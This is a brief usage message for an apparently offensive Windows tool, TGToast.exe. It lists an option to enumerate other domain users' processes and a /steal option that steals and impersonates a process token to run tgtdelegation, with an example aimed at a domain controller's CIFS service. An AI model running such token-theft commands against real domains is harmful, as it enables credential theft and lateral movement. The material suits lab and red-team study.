...
Usage: C:\Users\eddard.stark\Documents\TGToast.exe <option> [arguments]

Options:
  /list                         Lists processes from other domain users.
  /steal <PID> <domain> <spn>   Steals token, impersonates, and runs tgtdelegation.

  Example: C:\Users\eddard.stark\Documents\TGToast.exe /steal 6969 corp.local CIFS/dc01.corp.local
